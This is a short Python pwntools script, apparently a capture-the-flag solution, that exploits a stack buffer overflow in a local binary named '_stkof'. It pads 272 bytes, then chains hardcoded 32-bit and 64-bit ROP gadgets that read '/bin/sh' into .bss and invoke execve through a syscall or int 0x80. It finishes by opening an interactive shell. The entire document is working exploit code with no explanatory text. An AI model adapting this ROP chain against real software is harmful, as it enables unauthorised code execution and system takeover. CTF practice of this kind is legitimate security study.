#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
context.log_level="debug"
bin32 = 1
if bin32:
    a=process("./_stkof")
else:
    a=process("./__stkof")
#32 ==> 272  , 64 ==> 280 
def debug():
    gdb.attach(a,'''
    b *(0x804892E)
    ''')
a.recv()

ret32_10c=0x08099bbe
ret32=0x080481b2
pop_rdi_ret=0x00000000004005f6
pop_rdx_pop_rsi_ret=0x000000000043d9f9
pop_eax_ret=0x080a8af3
pop_rax_ret=0x043b97c
read32_addr=0x806C8E0
bss_64=0x6A3317
payload='A'*272
payload+=p32(ret32_10c)
payload+=p32(ret32)
payload+=p64(pop_rdi_ret)# 64 ROP
payload+=p64(0)
payload+=p64(pop_rdx_pop_rsi_ret)
payload+=p64(0x100)
payload+=p64(bss_64)
payload+=p64(0x00000000043B9C0)#read
payload+=p64(pop_rdi_ret)
payload+=p64(bss_64)
payload+=p64(pop_rdx_pop_rsi_ret)
payload+=p64(0)
payload+=p64(0)
payload+=p64(pop_rax_ret)
payload+=p64(59)
payload+=p64(0x00000000043BA02)#syscall
payload+='A'*(0x10c-14*8)
payload+=p32(read32_addr)#32 ROP
payload+=p32(0x08061bcb)#pop3ret
payload+=p32(0)
bss32=0x80DA32C
payload+=p32(bss32)
payload+=p32(0x100)
payload+=p32(0x0806e9f2)#pop ecx ebx _ret
payload+=p32(0)
payload+=p32(bss32)
payload+=p32(0x0806e9cb)
payload+=p32(0)
payload+=p32(pop_eax_ret)
payload+=p32(0xb)
payload+=p32(0x080495a3)#int 0x80
a.sendline(payload)
pause()
a.sendline('/bin/sh\x00')
a.interactive()
